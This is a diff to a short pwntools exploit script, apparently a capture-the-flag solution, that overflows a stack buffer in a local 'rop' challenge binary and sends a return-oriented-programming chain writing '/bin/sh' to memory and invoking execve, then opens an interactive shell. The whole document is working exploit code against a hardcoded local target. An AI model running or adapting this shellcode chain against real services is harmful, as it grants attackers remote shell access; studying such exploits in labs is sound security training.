@@ -1,37 +1,28 @@
 from pwn import *
 
+context.arch = 'amd64'
+
 #r = process('../rop/share/rop')
 r = remote('127.0.0.1', 10005)
 
-pop_rdi = 0x401ff0
-mov_rsi_rax = 0x418551
-pop_rsi = 0x408e5c
-pop_rax = 0x41732c
-pop_rdx_pop_rbx = 0x45d9c7
-syscall = 0x4011ef
-
-rop = b''
-rop += p64(pop_rsi)
-rop += p64(0x49d0c0)
-rop += p64(pop_rax)
-rop += b'/bin/sh\x00'
-rop += p64(mov_rsi_rax)
-
-rop += p64(pop_rax)
-rop += p64(0x3b)
-
-rop += p64(pop_rdi)
-rop += p64(0x49d0c0)
-
-rop += p64(pop_rsi)
-rop += p64(0)
-
-rop += p64(pop_rdx_pop_rbx)
-rop += p64(0)
-rop += p64(0)
-
-rop += p64(syscall)
-payload = b'A' * (0x20 + 8) + rop + p64(0xdeadbeef)
+rop = flat(
+    0x408e5c, # pop rsi ; ret
+    0x49d0c0, # writable address
+    0x41732c, # pop rax ; ret
+    b'/bin/sh\x00',
+    0x418551, # mov qword ptr [rsi], rax ; ret
+    0x41732c, # pop rax ; ret
+    0x3b, # execve
+    0x401ff0, # pop rdi ; ret
+    0x49d0c0, # writable address
+    0x408e5c, # pop rsi ; ret
+    0x0, # NULL
+    0x45d9c7, # pop rdx ; pop rbx ; ret
+    0x0, # NULL
+    0x0, # NULL
+    0x4011ef, # syscall
+)
+payload = b'A' * (0x20 + 8) + rop
 
 r.sendlineafter(b'Give me your message: ', payload)
 r.interactive()
